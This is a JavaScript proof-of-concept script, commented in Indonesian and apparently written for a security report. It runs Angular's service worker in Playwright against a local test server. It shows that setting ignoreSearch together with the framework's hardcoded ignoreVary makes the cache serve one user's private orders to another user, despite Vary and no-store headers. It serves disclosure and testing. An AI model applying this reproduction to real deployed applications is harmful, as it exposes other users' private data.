/**
 * KOMBINASI: ignoreSearch (didokumentasikan, dapat dikonfigurasi developer)
 * + ignoreVary (di-hardcode, TIDAK dapat dikonfigurasi).
 *
 * Masing-masing bisa dipertahankan sendiri. Bersama-sama, keduanya menghapus
 * SETIAP sinyal pembeda antara dua permintaan: query string DAN header.
 *
 * Developer yang menulis ignoreSearch:true sadar ia mengabaikan query.
 * Ia TIDAK sadar ia juga mengabaikan Vary.
 */
import {readFileSync, globSync} from 'fs';
import {createServer} from 'http';
import {createHash} from 'crypto';
import {join} from 'path';
import {pathToFileURL} from 'url';
import {createRequire} from 'module';

const nm = process.argv[2];
const {chromium} = createRequire(join(nm,'x.js'))('playwright');
const swDir = join(nm, '@angular/service-worker');
const {Generator} = await import(pathToFileURL(join(swDir,'fesm2022/config.mjs')).href);
const INDEX = readFileSync(new URL('../../../security-report/poc/index-f13.html', import.meta.url), 'utf8');
const files = {'/index.html': INDEX};

async function buildManifest(ignoreSearch){
  return await new Generator({
    list: async()=>Object.keys(files), read: async p=>files[p],
    hash: async p=>createHash('sha1').update(Buffer.from(files[p],'utf8')).digest('hex'),
    write: async()=>{},
  },'/').process({
    index:'/index.html',
    assetGroups:[{name:'app',installMode:'prefetch',resources:{files:['/index.html']}}],
    dataGroups:[{
      name:'api', urls:['/api/**'],
      ...(ignoreSearch ? {cacheQueryOptions:{ignoreSearch:true}} : {}),
      cacheConfig:{strategy:'performance',maxSize:100,maxAge:'1d'},
    }],
    navigationUrls:['/**'],
  });
}

const PROFILES = {ALICE:{name:'Alice',orders:['pesanan-rahasia-Alice']}, BOB:{name:'Bob',orders:['pesanan-Bob']}};
let manifest, hits = 0;
const srv = createServer((req,res)=>{
  const u = new URL(req.url,'http://x');
  if (u.pathname==='/ngsw-worker.js'){res.writeHead(200,{'Content-Type':'text/javascript'});res.end(readFileSync(join(swDir,'ngsw-worker.js')));return;}
  if (u.pathname==='/ngsw.json'){res.writeHead(200,{'Content-Type':'application/json','Cache-Control':'no-store'});res.end(JSON.stringify(manifest));return;}
  if (u.pathname==='/api/orders'){
    hits++;
    const bearer=(req.headers.authorization??'').replace(/^Bearer\s+/i,'');
    res.writeHead(200,{'Content-Type':'application/json','Vary':'Authorization','Cache-Control':'no-store'});
    res.end(JSON.stringify(PROFILES[bearer]??{name:'anon'}));return;
  }
  if (u.pathname==='/index.html'||u.pathname==='/'){res.writeHead(200,{'Content-Type':'text/html; charset=utf-8'});res.end(INDEX);return;}
  res.writeHead(404).end('nope');
});
await new Promise(r=>srv.listen(0,'127.0.0.1',r));
const APP=`http://localhost:${srv.address().port}`;
const CHROME=globSync('/opt/pw-browsers/chromium*/chrome-linux/chrome');

async function arm(ignoreSearch){
  manifest = await buildManifest(ignoreSearch);
  const b=await chromium.launch(CHROME.length?{executablePath:CHROME[0]}:{});
  const p=await (await b.newContext()).newPage();
  await p.goto(APP+'/index.html',{waitUntil:'load'});
  const ok=await p.evaluate(()=>window.__registerSW());
  if(!ok.ok){await b.close();return{fail:ok.message};}
  const before=hits;
  // Dua pengguna berbeda, query string berbeda, token berbeda.
  const a=await p.evaluate(([u])=>window.__request(u,'ALICE'),[APP+'/api/orders?user=alice']);
  const bb=await p.evaluate(([u])=>window.__request(u,'BOB'),[APP+'/api/orders?user=bob']);
  await b.close();
  return {cqo:JSON.stringify(manifest.dataGroups[0].cacheQueryOptions), alice:a.body, bob:bb.body,
          hits:hits-before, leak: bb.body===a.body};
}

let bocorDenganIgnoreSearch = null, bocorTanpa = null;
const line='='.repeat(78);
console.log(line);
console.log('KOMBINASI ignoreSearch (dikonfigurasi) + ignoreVary (di-hardcode)');
console.log(line);
console.log('\nAlice: GET /api/orders?user=alice  Authorization: Bearer ALICE');
console.log('Bob  : GET /api/orders?user=bob    Authorization: Bearer BOB');
console.log('Server mengirim Vary: Authorization DAN Cache-Control: no-store.\n');
for (const [label, val] of [['TANPA ignoreSearch (default)',false],['DENGAN ignoreSearch: true',true]]){
  const r=await arm(val);
  console.log(`  ${label}`);
  if(r.fail){console.log(`    GAGAL ${r.fail}`);continue;}
  console.log(`    cacheQueryOptions          ${r.cqo}`);
  console.log(`    Alice menerima             ${r.alice}`);
  console.log(`    Bob menerima               ${r.bob}`);
  console.log(`    permintaan ke server       ${r.hits}  (2 = normal)`);
  console.log(`    => Bob melihat data Alice? ${r.leak?'>>> YA':'tidak'}\n`);
  if (val) bocorDenganIgnoreSearch = r.leak; else bocorTanpa = r.leak;
}
const terkonfirmasi = bocorDenganIgnoreSearch === true && bocorTanpa === false;
if (terkonfirmasi) {
  console.log('TERKONFIRMASI. Kontrol (tanpa ignoreSearch) AMAN, jadi yang diisolasi');
  console.log('memang kombinasinya, bukan salah satu opsi sendirian.');
  console.log('');
  console.log('ignoreSearch: developer TAHU ia mengabaikan query string — itu pilihannya.');
  console.log('ignoreVary  : developer TIDAK TAHU ia juga mengabaikan header permintaan,');
  console.log('              karena opsi itu di-hardcode dan tidak ada di tipe publik.');
  console.log('Bersama-sama keduanya menghapus SETIAP sinyal pembeda antara dua');
  console.log('permintaan. Server sudah mengirim Vary: Authorization DAN');
  console.log('Cache-Control: no-store; tidak satu pun menolong.');
} else {
  console.log(`Tidak terkonfirmasi (dengan=${bocorDenganIgnoreSearch} tanpa=${bocorTanpa}).`);
}
console.log(line);
srv.close();
process.exit(terkonfirmasi ? 0 : 1);
